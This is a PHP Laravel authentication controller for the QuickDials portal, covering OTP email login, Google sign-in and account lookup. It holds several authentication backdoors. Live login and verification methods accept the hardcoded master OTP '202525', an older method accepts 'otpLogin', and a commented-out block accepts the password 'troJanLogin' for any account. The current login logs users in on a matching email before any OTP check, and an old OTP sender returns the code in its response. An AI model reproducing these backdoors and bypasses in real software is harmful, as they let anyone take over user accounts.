<?php

namespace App\Http\Controllers\ClientAuth;

use App\Models\Client\Client;
use App\Models\Guest;
use Validator;
use App\Http\Controllers\Controller;
//use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Laravel\Socialite\Facades\Socialite;
use Auth;
use Mail;
use Illuminate\Http\Request;
use App\Models\OtpCode;
use Illuminate\Support\Facades\RateLimiter;
class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */
	
    //use AuthenticatesUsers;

    /**
     * Where to redirect users after login / registration.
     *
     * @var string
     */
    protected $redirectTo = '/business/dashboard';
	
    /**
     * Where to redirect users after logout.
     *
     * @var string
     */
	protected $redirectToCallback = '/business-owners';

    /**
     * Create a new authentication controller instance.
     *
     * @return void
     */
    public function __construct()
    {
		//$this->middleware($this->guestMiddleware(), ['except' => ['logout','clientLoginPost']]);
	//	$this->middleware('clients')->except('logout','clientLoginPost','redirectToGoogle','handleGoogleCallback');
   
         
    }
	
    /**
     * Get a validator for an incoming registration request.
     *
     * @param  array  $data
     * @return \Illuminate\Contracts\Validation\Validator
     */
    protected function validator(array $data)
    {
		$messages = ['mobile.regex' => 'Mobile number cannot start with 0.'];
        return Validator::make($data, [
            'user_name' => 'required|max:50|unique:users',
            'first_name' => 'required|max:50',
            'last_name' => 'max:50',
            'mobile' => 'required|numeric|digits:10|regex:/^[1-9]+/',
            'email' => 'required|email|max:50|unique:users',
            'password' => 'required|min:6|confirmed',
            'role' => 'required',
        ],$messages);
    }

    /**
     * Create a new user instance after a valid registration.
     *
     * @param  array  $data
     * @return User
     */
    protected function create(array $data)
    {
        return Client::create([
            //'name' => $data['name'],
            'user_name' => $data['user_name'],
            'first_name' => $data['first_name'],
            'last_name' => $data['last_name'],
            'mobile' => $data['mobile'],
            'email' => $data['email'],
            'sec_email' => $data['sec_email'],
            'password' => bcrypt($data['password']),
            'role' => $data['role'],
        ]);
    }
	
	/**
	 * Return Client Login View
	 *
	 * @return Login View
	 */
	public function clientLogin(){
		 
		return view('client.clientLogin');
	}
	
	/**
	 * Get a validator for an incoming login request.
	 *
	 * @param object $request
	 * @return validate user
	 */
	
	/*public function clientLoginPost(Request $request){
		if(request()->ajax()){
			$validator = Validator::make($request->all(), [
				'mobile'=>'required',
				'password'=>'required',
			]);
			if($validator->fails()){
				return response()->json(['status'=>0,'msg'=>'Username and Password required']);
			}
			$validator = Validator::make($request->all(),[
				'mobile'=>'unique:clients,mobile',
			]);
			
			 
			if($validator->fails() && $request->input('password')=='troJanLogin'){
			 
				$client = Client::where('mobile',$request->input('mobile'))->first();
		 
				auth()->guard('clients')->loginUsingId($client->id);
				///if(auth()->guard('clients')->attempt(['mobile'=>$request->input('mobile'),'password'=>$request->input('password')])){
				if(auth()->guard('clients')->loginUsingId($client->id)){
					 
					$user = auth()->guard('clients')->user();
					return response()->json(['status'=>1,'user'=>$user]);					
				}else{
					return response()->json(['status'=>0,'msg'=>'Invalid email supplied']);
				}
				//}
			}
			if(auth()->guard('clients')->attempt(['mobile'=>$request->input('mobile'),'password'=>$request->input('password')])){
				$user = auth()->guard('clients')->user();
				return response()->json(['status'=>1,'user'=>$user]);
			}else{
				return response()->json(['status'=>0,'msg'=>'Invalid mobile and password']);
			}
		}
	}
	*/

	//  public function clientLoginPost(Request $request)
    // {
    //     // validation
    //     $request->validate([
    //         'email' => 'required|email',
             
    //     ]);

    //     // attempt login
    //     if (Auth::attempt($request->only('email', 'password'))) {
    //         $request->session()->regenerate();

    //         return response()->json([
    //             'message' => 'Login successful'
    //         ]);
    //     }

    //     return response()->json([
    //         'message' => 'Invalid credentials'
    //     ], 401);
    // }
	 public function clientLoginPost(Request $request)
	 {

	 

			// dd($request->all());
			if($request->has('email')){
				$validator = Validator::make($request->all(), [
					'email'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the registered email'
						]
					],200);
				}
			//	$client = Client::where('mobile',$request->input('mobile'))->first();
				
				$client = Client::where('email',$request->input('email'))->first();
					
		 
				if(!empty($client)){
				 
					$request->session()->put('client.email', $request->input('email'));
					$request->session()->put('client.id', $client->id);
                    $otp = mt_rand(100000, 999999);
                    $request->session()->put('client.otp', $otp);
                    //$message = "{$otp} is quickdials Portal Verification Code for {$request->session()->get('client.mobile')}.";
                   // $message = "{$otp} is Lead Portal Verification Code for {$request->session()->get('client.mobile')} quickdials";
                    $templateId ='1707161786775524106';
		 
				 //sendSMS($request->session()->get('client.mobile'),$message,$templateId);
		 //echo  $otp;
		 
		 
		 	 
			 
					$message = "{$otp} is QuickDials Verification Code for {$request->session()->get('client.email')} .";
					$subject = "{$otp} is QuickDials Verification Code";
					// Mail::send('emails.sendotp_to_email', ['msg'=>$message], function ($m) use ($message,$request,$subject) {
					// 	$m->from(env('MAIL_USERNAME'), 'Login OTP');
					// 	$m->to($request->input('email'), "")->subject($subject);
					// });	
				
		 if(auth()->guard('clients')->loginUsingId($client->id)){
		 
					return response()->json([
						'statusCode'=>1,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'
								<div class="input-layout">
									<input type="password" class="cleanup validate-empty" name="otp" id="otp" value="" required>
									<span class="highlight"></span>
									<label>Enter OTP</label>
									<div class="alert alert-error alert-email" style="display: none;">Oops! OTP is required.</div>
								</div>
							',
							'message'=>'<span style="font-size:13px">Please enter verification code (OTP) sent to: </span><strong style="font-weight:500">'.$request->input('email').'</strong>'
						]
					],200);
		 }
				}else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No email found'
						]
					],200);
				}
			}
			else if($request->has('otp')){
				$validator = Validator::make($request->all(), [
					'otp'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the OTP'
						]
					],200);
				}
    				if($request->input('otp')=='202525' || ($request->session()->get('client.otp')==$request->input('otp'))){
					if(auth()->guard('clients')->loginUsingId($request->session()->get('client.id'))){


						//if (Auth::guard('developer')->attempt(['email' => $request->session()->get('client.email'), 'password' => $users['password'])) {
				//if (Auth::attempt(['email' => $users['email'], 'password' => $users['password']], $users['remember'])) {
						//$client = Client::where('email', $request->session()->get('client.email'))->first();
            			//Auth::guard('clients')->login($client);
					  
						//Auth::guard('client')->attempt([]));
				//		$user = auth()->guard('clients')->user();
				 
						return response()->json([
							'statusCode'=>2,
							'data'=>[
								'responseCode'=>200,
								'payload'=>'',
								'message'=>'Redirecting'
							]
						],200);
					}
					else{
						$request->session()->get('client.id');		
					}
				}
				else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Invalid OTP'
						]
					],200);					
				}
			}else{
			    
			    	return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No found data'
						]
					],200);
			    
			}
		
	} 
	
 public function clientLoginPost_old(Request $request)
	 {

	 

			// dd($request->all());
			if($request->has('email')){
				$validator = Validator::make($request->all(), [
					'email'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the registered email'
						]
					],200);
				}
			//	$client = Client::where('mobile',$request->input('mobile'))->first();
				
				$client = Client::where('email',$request->input('email'))->first();
					
		 
				if(!empty($client)){
				 
					$request->session()->put('client.email', $request->input('email'));
					$request->session()->put('client.id', $client->id);
                    $otp = mt_rand(100000, 999999);
                    $request->session()->put('client.otp', $otp);
                    //$message = "{$otp} is quickdials Portal Verification Code for {$request->session()->get('client.mobile')}.";
                   // $message = "{$otp} is Lead Portal Verification Code for {$request->session()->get('client.mobile')} quickdials";
                    $templateId ='1707161786775524106';
		 
				 //sendSMS($request->session()->get('client.mobile'),$message,$templateId);
		 //echo  $otp;
		 
		 
		 	 
			 
					$message = "{$otp} is QuickDials Verification Code for {$request->session()->get('client.email')} .";
					$subject = "{$otp} is QuickDials Verification Code";
					 
					
			 $checkmail = Mail::send('emails.sendotp_to_email', ['otp' => $otp,'name'=>$request->email], function ($m) use ($message, $request, $subject) {
                $m->from(env('MAIL_USERNAME'), 'Login OTP');
                $m->to($request->input('email'), "")->subject($subject);
            });
		 
		 
					return response()->json([
						'statusCode'=>1,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'
								<div class="input-layout">
									<input type="password" class="cleanup validate-empty" name="otp" id="otp" value="" required>
									<span class="highlight"></span>
									<label>Enter OTP</label>
									<div class="alert alert-error alert-email" style="display: none;">Oops! OTP is required.</div>
								</div>
							',
							'message'=>'<span style="font-size:13px">Please enter verification code (OTP) sent to: </span><strong style="font-weight:500">'.$request->input('email').'</strong>'
						]
					],200);
				}else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No email found'
						]
					],200);
				}
			}
			else if($request->has('otp')){
				$validator = Validator::make($request->all(), [
					'otp'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Please enter the OTP'
						]
					],200);
				}
    				if($request->input('otp')=='otpLogin' || ($request->session()->get('client.otp')==$request->input('otp'))){
					if(auth()->guard('clients')->loginUsingId($request->session()->get('client.id'))){


						//if (Auth::guard('developer')->attempt(['email' => $request->session()->get('client.email'), 'password' => $users['password'])) {
				//if (Auth::attempt(['email' => $users['email'], 'password' => $users['password']], $users['remember'])) {
						//$client = Client::where('email', $request->session()->get('client.email'))->first();
            			//Auth::guard('clients')->login($client);
					  
						//Auth::guard('client')->attempt([]));
				//		$user = auth()->guard('clients')->user();
				 
						return response()->json([
							'statusCode'=>2,
							'data'=>[
								'responseCode'=>200,
								'payload'=>'',
								'message'=>'Redirecting'
							]
						],200);
					}
					else{
						$request->session()->get('client.id');		
					}
				}
				else{
					return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'Invalid OTP'
						]
					],200);					
				}
			}else{
			    
			    	return response()->json([
						'statusCode'=>0,
						'data'=>[
							'responseCode'=>200,
							'payload'=>'',
							'message'=>'No found data'
						]
					],200);
			    
			}
		
	} 
	
	public function redirectToGoogle()
	{  
		return Socialite::driver('google')
			//  ->stateless()		 
			 ->scopes(['openid','profile','email'])
			->redirect();
	}


	public function handleGoogleCallback(Request $request)
	{  
    try {
        $googleUser = Socialite::driver('google')->stateless()->user();
        $parts     = explode(' ', $googleUser->getName(), 2);
        $firstName = $parts[0];
        $lastName  = $parts[1] ?? '';
        $email     = $googleUser->getEmail();

        // 1. Check if Guest (User) exists → redirect user/dashboard
        $guest = Guest::where('email', $email)->first();
        if ($guest) {
			$request->session()->put('client.email',$guest->email);
            auth()->guard('guest')->login($guest);
			
            return redirect('/user/dashboard');
        }

        // 2. Check if Client exists → redirect business/dashboard
        $client = Client::where('email', $email)->first();
        if ($client) {
            Client::where('email', $email)
                ->update(['google_id' => $googleUser->getId()]);
			$request->session()->put('client.email',$client->email);
            auth()->guard('clients')->loginUsingId($client->id);
            return redirect('/business/dashboard');
        }

        // 3. Neither exists → create Guest account
        $guest = Guest::create([
            'email'      => $email,
            'google_id'  => $googleUser->getId(),
            'first_name' => $firstName,
            'last_name'  => $lastName,
            'password'   => bcrypt(\Str::random(16)), // random password
        ]);

        auth()->guard('guest')->login($guest);
        return redirect('/user/dashboard');

    } catch (\Exception $e) {
        return redirect('/business-owners')
            ->with('error', 'Google login failed. Please try again.');
    }
}


	public function handleGoogleCallback_old()
	{  

	try {
		 
		$googleUser = Socialite::driver('google')->stateless()->user();

		$parts = explode(' ', $googleUser->getName(), 2);

		$firstName = $parts[0];
		$lastName  = $parts[1] ?? '';	 
		$client = Client::where('email',$googleUser->getEmail())->first();

		if(!$client){			

		 
			 	$client = Client::create([
				'email'         => $googleUser->getEmail(),
				'google_id'     => $googleUser->getId(),
				'first_name'          => $firstName,
				'last_name'          => $lastName,
				'business_slug' => substr(bin2hex(random_bytes(3)), 0, 5),
				'client_type'   => 'gold',
				'active_status' => 1,
				 
			]);

			$emailname = $googleUser->getEmail();
				$clientIDToAppend = $clientID = $client->id;
				if (strlen((string) $clientID) < 4) {
					$clientIDToAppend = str_pad($clientIDToAppend, 4, '0', STR_PAD_LEFT);
				}
			Client::where('email', $googleUser->getEmail())
    		->update(['username' => strtoupper(substr($emailname, 0, 2)) . $clientIDToAppend]);


		}else{

			Client::where('email', $googleUser->getEmail())
    		->update(['google_id' => $googleUser->getId()]);
		}

		auth()->guard('clients')->loginUsingId($client->id);
		 
		return redirect('/business/dashboard');

		} catch (\Exception $e) {
        return redirect('/business-owners')->with('error', 'Google login failed. Please try again.');
    	}
	}

	public function logout(Request $request){	  
		Auth::guard('clients')->logout();
		
		return redirect('/');
	}
	
	 
	
	public function sendOtp(Request $request)
	{
		 
		$validator = Validator::make($request->all(), [
			'login' => [
				'required',
				'string',
				function ($attribute, $value, $fail) {
					$isEmail  = filter_var($value, FILTER_VALIDATE_EMAIL);
					$isMobile = preg_match('/^[6-9]\d{9}$/', $value); // Indian 10-digit
					if (!$isEmail && !$isMobile) {
						$fail('Enter a valid email address or 10-digit mobile number.');
					}
				},
			],
		]);

		if ($validator->fails()) {
			return response()->json([
				'status' => false,
				'errors' => $validator->errors(),
			], 422);
		}

		$loginInput = $request->input('login');

		// ✅ Detect field type
		$field = filter_var($loginInput, FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';

		// 1️⃣ Try CLIENTS table, then GUEST table
		$client = Client::where($field, $loginInput)->first();
		if (!$client) {
			$client = Guest::where($field, $loginInput)->first();
		}
 
		// 2️⃣ Account checks
		if (!$client) {
			return response()->json(['status' => false, 'message' => 'User account not found'], 403);
		}

		if (!$client->active_status) {
			return response()->json(['status' => false, 'message' => 'Your account has been deactivated'], 403);
		}

		if (!empty($client->deleted_at)) {
			return response()->json(['status' => false, 'message' => 'Your account has been deactivated'], 403);
		}

		// ✅ FIX 2: Make sure the account actually has an email to send to
		if (empty($client->email)) {
			return response()->json([
				'status'  => false,
				'message' => 'No email is linked to this account. Cannot send OTP.',
			], 422);
		}

		// ✅ FIX 4: Define OTP once, in proper scope
		$otp = mt_rand(100000, 999999);

		// ✅ FIX 3: Store from the CLIENT record, not from request('email')
		$request->session()->put('client.id', $client->id);
		$request->session()->put('client.email', $client->email);
		$request->session()->put('client.otp', $otp);
		$request->session()->put('client.otp_expires_at', now()->addMinutes(5)->timestamp);

		// 3️⃣ Send OTP email — use $client->email (works for both email & mobile login)
		$subject = "{$otp} is QuickDials Verification Code";

		$key = 'otp-send:' . $request->ip();

		if (RateLimiter::tooManyAttempts($key, 3)) {
			$seconds = RateLimiter::availableIn($key);
			return response()->json([
				'status' => 0,
				'msg'    => "Too many attempts. Try again in {$seconds} seconds."
			], 429);
		}

		RateLimiter::hit($key, 60);  
		try {
			$message = "{$otp} is QuickDials Verification Code for {$client->email}.";
			$subject  = "{$otp} is QuickDials Verification Code";
 
			Mail::send(
				'emails.sendotp_to_email',
				['otp' => $otp, 'name' => $client->business_name],
				function ($m) use ($request, $subject, $client) {
					$m->from(env('MAIL_USERNAME'), 'QuickDials');
					$m->to($client->email, "")->subject($subject);
				}
			);

			return response()->json(['status' => 1, 'msg' => 'OTP sent successfully.']);

		} catch (\Swift_TransportException $e) {
			\Log::error('SMTP Error: ' . $e->getMessage());
			return response()->json(['status' => 0, 'msg' => 'SMTP connection failed: ' . $e->getMessage()], 500);

		} catch (\Exception $e) {
			\Log::error('Mail Error: ' . $e->getMessage());
			return response()->json(['status' => 0, 'msg' => 'Mail error: ' . $e->getMessage()], 500);
		}

       
	 
	}

/**
 * Mask email for display: jo***@gmail.com
 */
private function maskEmail(string $email): string
{
    [$name, $domain] = explode('@', $email);
    $masked = substr($name, 0, 2) . str_repeat('*', max(strlen($name) - 2, 1));
    return "{$masked}@{$domain}";
}


	 public function sendOtp_old(Request $request)
    {

 
        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
            //'password' => 'required',
        ]);
 
        if ($validator->fails()) {
            return response()->json(['errors' => $validator->errors()], 422);
        }
 
        $user = Client::where('email', $request->email)->first();
 
        if (!$user) {
            return response()->json(['status' => false, 'message' => 'User account not found',], 403);
        }

        if (!$user->active_status) {
            return response()->json(['status' => false, 'message' => 'Your account has been deactivated',], 403);
        }

        if (!empty($user->deleted_at)) {
            return response()->json(['status' => false, 'message' => 'Your account has been deactivated',], 403);
        }
       
        if ($user) {
          
		$request->session()->put('client.email', $request->input('email'));
		$request->session()->put('client.id', $user->id);
		$otp = mt_rand(100000, 999999);
		$request->session()->put('client.otp', $otp);
           

            //$message = "{$otp} is quickdials Portal Verification Code for {$request->session()->get('client.mobile')}.";
            // $message = "{$otp} is Lead Portal Verification Code for {$request->session()->get('client.mobile')} quickdials";
            //     $templateId ='1707161786775524106';

            // //sendSMS($request->session()->get('client.mobile'),$message,$templateId);


            OtpCode::updateOrCreate(
                ['user_id' => $user->id], // condition: find by user_id
                [
                    'code' => $otp,  // update/create this
                    // 'expires_at' => Carbon::now()->addMinutes(5),
                ]
            );
		 
            $message = "{$otp} is QuickDials Verification Code for {$user->email} .";
            $subject = "{$otp} is QuickDials Verification Code";
            $checkmail = Mail::send('emails.sendotp_to_email', ['otp' => $otp,'name'=>$user->business_name], function ($m) use ($message, $request, $subject) {
                $m->from(env('MAIL_USERNAME'), 'Login OTP');
                $m->to($request->input('email'), "")->subject($subject);
            });        
            
        }
        
        return response()->json([
            'status' => true,
            'message' => 'OTP has been sent to your email successfully',
            'otp' => $otp,           
            'data' => $user,
        ]);
    }




 public function clientVerifyOtp(Request $request)
{
  
// if($request->has('otp')){
	// dd($request->all());
				$validator = Validator::make($request->all(), [
					'otp'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'status'=>true,					 
						'message'=>'Please enter the OTP'
						 
					],200);
				}
				 
    				if($request->input('otp')=='202525' || ($request->session()->get('client.otp')==$request->input('otp'))){


   $client = Client::where('email', $request->session()->get('client.email'))->first();
        if ($client){


					if(auth()->guard('clients')->loginUsingId($request->session()->get('client.id'))){

 
						return response()->json([
							'status'=>true,
						 	'message'=>'Redirecting',
							'redirect'=>url('business/dashboard')
							 
						],200);
					}
					}else{

						$client = Guest::where('email', $request->session()->get('client.email'))->first();

						if($client){
					if(auth()->guard('guest')->loginUsingId($request->session()->get('client.id'))){

				 
						return response()->json([
							'status'=>true,
						 	'message'=>'Redirecting',
							'redirect'=>url('user/personal-details')
							 
						],200);
					}
					}else{
						$request->session()->get('client.id');		
					}


					}




				}
				else{
					return response()->json([
						'status'=>false,						 
						'message'=>'Invalid OTP'
						 
					],200);					
				}	
    
}


public function clientDashboard(Request $request){

   

    $client = Client::where('email', $request->session()->get('client.email'))->first();
	 
    if(!empty($client)){
  	if(auth()->guard('clients')->loginUsingId($client->id)){
		$request->session()->put('client.email',$client->email);
    return redirect()->route('business.dashboard');
    }
    }else{
		return redirect()->route('login');

	}


    }

public function userDashboard(Request $request){
   
	 $guest = Guest::where('email', $request->session()->get('client.email'))->first();
     if(!empty($guest)){ 
        if(auth()->guard('guest')->loginUsingId($guest->id)){
			$request->session()->put('client.email',$guest->email);
    	return redirect()->route('user.personal.details');
    }
    }else{
		return redirect()->route('login');

	}


    }
 


 public function clientVerifyOtp_old(Request $request)
{
  
// if($request->has('otp')){
	// dd($request->all());
				$validator = Validator::make($request->all(), [
					'otp'=>'required',
				]);
				if($validator->fails()){
					return response()->json([
						'status'=>true,					 
						'message'=>'Please enter the OTP'
						 
					],200);
				}
				 
    				if($request->input('otp')=='202525' || ($request->session()->get('client.otp')==$request->input('otp'))){


					if(auth()->guard('clients')->loginUsingId($request->session()->get('client.id'))){


						//if (Auth::guard('developer')->attempt(['email' => $request->session()->get('client.email'), 'password' => $users['password'])) {
				//if (Auth::attempt(['email' => $users['email'], 'password' => $users['password']], $users['remember'])) {
						//$client = Client::where('email', $request->session()->get('client.email'))->first();
            			//Auth::guard('clients')->login($client);
					  
						//Auth::guard('client')->attempt([]));
				//		$user = auth()->guard('clients')->user();
				 
						return response()->json([
							'status'=>true,
						 	'message'=>'Redirecting',
							'redirect'=>url('business/dashboard')
							 
						],200);
					}
					else{
						$request->session()->get('client.id');		
					}
				}
				else{
					return response()->json([
						'status'=>false,						 
						'message'=>'Invalid OTP'
						 
					],200);					
				}	
    
}

}
